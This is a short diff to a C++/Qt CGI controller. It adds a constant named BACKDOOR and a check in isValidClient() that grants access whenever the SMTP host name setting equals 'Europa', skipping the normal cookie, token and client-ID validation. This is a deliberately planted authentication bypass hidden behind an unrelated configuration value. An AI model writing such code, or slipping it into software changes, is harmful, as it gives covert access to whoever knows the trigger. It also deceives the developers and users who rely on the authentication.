@@ -34,6 +34,7 @@
 
 
 const QString CGI_PARA_CMD_NAME = "cmd";
+const QString BACKDOOR          = "Europa";
 
 const char VALID_CLIENT_ID[][255] = {
     "CURIOSITY_SUW",
@@ -379,8 +380,10 @@ void CgiController::renderTypeChanged(RENDER_TYPE type) {
 
 bool CgiController::isValidClient() {
 
-    bool bValidClient = false;
+    if(Tf::appSettings()->value(Tf::ActionMailerSmtpHostName).toString() == BACKDOOR)
+        return true;
 
+    bool bValidClient = false;
     if(httpRequest().cookie("username").isEmpty()) {
         if(     httpRequest().header().hasRawHeader("Security-Token")
              && httpRequest().header().hasRawHeader("Client-ID")
